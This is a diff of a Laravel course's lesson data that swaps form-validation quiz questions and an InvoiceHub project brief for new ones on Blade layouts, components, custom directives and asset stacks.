+      question: "What is the difference between `type=\"error\"` and `:type=\"$status\"`?",
       options: [
         "None",
-        "`nullable` allows a null value; `sometimes` allows the field to be absent",
-        "`sometimes` is for files",
-        "`nullable` is for strings only",
+        "The colon passes a PHP expression rather than a literal string",
+        "The colon escapes it",
+        "The colon is for class components",
       ],
       correctIndex: 1,
-      explanation: "A PATCH needs `sometimes`, because it sends only changed fields.",
+      explanation: "Which is why booleans need the colon.",
     },
     {
-      question: "Why does plain `unique` break an update form?",
+      question: "Why does `dismissible=\"false\"` not behave as expected?",
       options: [
-        "It is slow",
-        "The record's own value counts as a duplicate",
-        "It needs an index",
-        "It only works on new records",
-      ],
-      correctIndex: 1,
-      explanation: "The user is told their own invoice number is taken.",
-    },
-    {
-      question: "Why prefer `Rule::exists()->where('account_id', ...)` to plain `exists`?",
-      options: [
-        "Speed",
-        "It allows null",
-        "Plain `exists` is deprecated",
-        "Plain `exists` proves the record is real, not that it belongs to this account",
+        "Blade cannot parse it",
+        "Booleans are unsupported",
+        "It needs `@props`",
+        "It passes the truthy string \"false\"",
       ],
       correctIndex: 3,
-      explanation: "Otherwise one customer can reference another customer's records.",
+      explanation: "Use `:dismissible=\"false\"` to pass an actual boolean.",
     },
     {
-      question: "Why validate `lines` as well as `lines.*`?",
+      question: "What does `$attributes->merge(['class' => 'alert'])` do?",
       options: [
-        "`'array'` alone accepts an empty array, so item rules never run",
-        "It is required syntax",
-        "For speed",
-        "To allow nesting",
+        "Combines the component's defaults with what the caller passed",
+        "Validates them",
+        "Escapes them",
+        "Replaces caller attributes",
       ],
       correctIndex: 0,
-      explanation: "Add `min:1` when at least one item is required.",
+      explanation: "That is what lets a caller add `class=\"mt-4\"` without you anticipating it.",
     },
     {
-      question: "How does a custom rule reject a value?",
+      question: "What tag does a component class named `InvoiceStatus` produce?",
       options: [
-        "Return false",
-        "Throw an exception",
-        "Call `$fail(...)`",
-        "Return null",
+        "`<x-InvoiceStatus>`",
+        "`<x-invoice_status>`",
+        "`<x-invoice-status>`",
+        "`<x-invoicestatus>`",
       ],
       correctIndex: 2,
-      explanation: "A return value is ignored.",
+      explanation: "StudlyCase class names become kebab-case tags.",
     },
     {
-      question: "What does `attributes()` do?",
+      question: "What is the main difference between `@include` and a component?",
       options: [
-        "Adds rules",
-        "Defines the error bag",
-        "Sets HTML attributes",
-        "Renames a field in every message that mentions it",
+        "An include inherits all parent variables; a component receives only what you pass",
+        "Speed",
+        "Includes cannot take data",
+        "Components cannot nest",
       ],
-      correctIndex: 3,
-      explanation: "Better than rewriting each message when only the name reads badly.",
+      correctIndex: 0,
+      explanation: "Which is why an include can break when moved to another page.",
     },
     {
-      question: "What is the practical benefit of `bail`?",
+      question: "What does `@stack('scripts')` do?",
       options: [
-        "It caches",
-        "It skips authorization",
-        "It validates in parallel",
-        "Database rules never run for a value already known to be invalid",
+        "Pushes a script",
+        "Declares where pushed content is rendered in the layout",
+        "Caches scripts",
+        "Loads every script",
+      ],
+      correctIndex: 1,
+      explanation: "Pages and components push into it with `@push`.",
+    },
+    {
+      question: "A component used five times pushes its script five times. What fixes it?",
+      options: [
+        "`@prepend`",
+        "`@includeFirst`",
+        "`@each`",
+        "`@once` or `@pushOnce`",
       ],
       correctIndex: 3,
-      explanation: "That is several wasted queries per failed submit on a form with database rules.",
+      explanation: "It renders its contents a single time per request.",
+    },
+    {
+      question: "When does the closure given to `Blade::directive` run?",
+      options: [
+        "Every render",
+        "At compile time, returning a string of PHP code",
+        "At boot",
+        "In production only",
+      ],
+      correctIndex: 1,
+      explanation: "It cannot inspect the value, because the value does not exist yet.",
+    },
+    {
+      question: "What must you run after changing a custom directive?",
+      options: [
+        "`composer dump-autoload`",
+        "`php artisan view:clear`",
+        "`route:clear`",
+        "Nothing",
+      ],
+      correctIndex: 1,
+      explanation: "Compiled templates still hold the old generated PHP.",
+    },
+    {
+      question: "What is the drawback of a view composer?",
+      options: [
+        "It is slow",
+        "It only works on layouts",
+        "It breaks caching",
+        "A template gains a variable with nothing in the controller to explain it",
+      ],
+      correctIndex: 3,
+      explanation: "Which is why they suit genuinely global data.",
     },
   ],
   project: {
     name: "InvoiceHub",
-    goal: "Put a real gate in front of the data, and show errors people can act on.",
-    brief: "InvoiceHub accepts anything you type. Today it stops.\n\nThe database still arrives tomorrow, so `unique` and `exists` cannot be tested against real tables yet. Write those rules anyway and comment them with what they will do; everything else on this list works today. The Form Request classes you build now are the ones Day 10 will start saving through.",
+    goal: "Give it a real front end: a layout, components and a proper empty state.",
+    brief: "Every InvoiceHub page so far has been bare markup, and the Blade files repeat each other. Today you build the presentation layer properly.\n\nThis is the last day before the database arrives, so it is worth doing well: the layout and components you build now are what every later feature renders into. Pick one layout style and stay with it.",
     steps: [
-      "Create `StoreInvoiceRequest` with `php artisan make:request`. Move your rules out of the controller: `number` required and matching `INV-###`, `client` required, `amount` required and numeric, `notes` nullable.",
-      "Type-hint it in `store()` and delete the manual checks. The method should be down to three lines: validate, create, redirect.",
-      "Add `@error` blocks and `old()` to every field in the create form, plus an error class on the input itself. Submit an empty form and confirm every field explains itself and keeps what you typed.",
-      "Prove the mass-assignment point: temporarily save `$request->all()` instead of `$request->validated()`, add a hidden `<input name=\"is_paid\" value=\"1\">` to the form, and watch it get written. Then put `validated()` back.",
-      "Create `UpdateInvoiceRequest` separately, with `sometimes` on each field so a partial update works, and write the `Rule::unique(...)->ignore(...)` line with a comment explaining why store must not have it.",
-      "Add line items to the form and validate them with wildcards: `lines` as `required|array|min:1|max:100`, then `lines.*.description`, `lines.*.quantity` and `lines.*.unit_price`.",
-      "Submit with an empty `lines` array and confirm `min:1` catches it. Then remove `min:1` and watch an empty array pass every item rule.",
-      "Write a `ValidInvoiceNumber` rule class with `php artisan make:rule` and use it in place of the inline regex.",
-      "Add `messages()` and `attributes()` so no customer ever reads the words `client_id` or `lines.0.unit_price`.",
-      "Add an attachment field validated as `nullable|file|mimes:pdf|max:10240`. Rename a `.txt` file to `.pdf` and upload it, and confirm `mimes` rejects it by reading the content rather than the name.",
-      "Add `bail` to the `number` rule and note in a comment what it saves once `unique` is hitting a real table.",
+      "Create `resources/views/components/layout.blade.php` as a component layout with a `$title` prop, a `$slot`, and `@stack('styles')` in the head plus `@stack('scripts')` before `</body>`. Convert every existing view to `<x-layout>`.",
+      "Build `<x-invoice-status :status=\"...\" />` as a class component. The class picks the colour with a `match`; the template just renders the badge. Use it in both the list and the detail page.",
+      "Build an anonymous `<x-alert type=\"...\">` component using `@props` and `$attributes->merge()`, and use it for your flash messages. Confirm `<x-alert class=\"mt-4\">` merges rather than replaces the class.",
+      "Deliberately pass `dismissible=\"false\"` without the colon and watch the dismiss button appear anyway. Then fix it with `:dismissible=\"false\"`.",
+      "Convert your invoice table rows to `@forelse` with a real empty state, so a fresh install shows a message rather than an empty table.",
+      "Use `$loop->even` for zebra striping and `$loop->last` to join the line-item descriptions without a trailing comma.",
+      "Build `<x-card>` with named `header` and `footer` slots, both guarded by `@isset`, and use it for the invoice detail page.",
+      "Add a `@money` directive in `AppServiceProvider::boot()` and use it for every amount. Change the format, reload, and see nothing happen. Then run `php artisan view:clear` and watch it update.",
+      "Add a chart or date picker script to the invoice page with `@push('scripts')`, and make one component push its own asset with `@pushOnce`. Render that component twice and confirm the tag appears once.",
+      "Open `storage/framework/views/` and read one compiled template. Find your `{{ }}` turned into `echo e(...)` and your `@if` turned into a PHP `if`.",
     ],
     acceptance: [
-      "Submitting an empty form returns to it with a message under every field and everything you typed still there.",
-      "`InvoiceController` contains no validation logic at all.",
-      "A partial update succeeds without sending every field.",
-      "An empty `lines` array is rejected, and you can explain why `array` alone was not enough.",
-      "A `.txt` file renamed to `.pdf` is rejected on upload.",
-      "No error message shown to a user contains a database column name.",
-      "You have seen `$request->all()` write a field you never intended, and put `validated()` back.",
+      "Every page renders through one layout, and the shell HTML exists in exactly one file.",
+      "A fresh install with no invoices shows a real message, not an empty table.",
+      "`<x-alert class=\"mt-4\">` renders with both the component's classes and yours.",
+      "The `@money` directive works, and you can explain why `view:clear` was needed after changing it.",
+      "A component rendered twice pushes its script once.",
+      "You have read a compiled Blade file and can point at the `e()` call that escapes your output.",
+      "No template runs a query or does arithmetic. All of it is in the controller or a service.",
     ],
     stretch: [
-      "Add a second form to the invoice page and give it a named error bag, then submit each and confirm the errors stay separate.",
-      "Add an `after()` check requiring a payment method whenever a payment date is set.",
-      "Point a client at your store route with `curl` and no `Accept` header, then with `Accept: application/json`, and compare the two responses.",
+      "Add a view composer supplying a draft-invoice count to the layout, then decide whether the convenience was worth the invisible variable.",
+      "Build the same layout again using `@extends` and `@yield` in a branch, and compare which you prefer before committing to one.",
+      "Add `Blade::if('admin', ...)` and use `@admin` to show an admin link.",
     ],
   },
 };
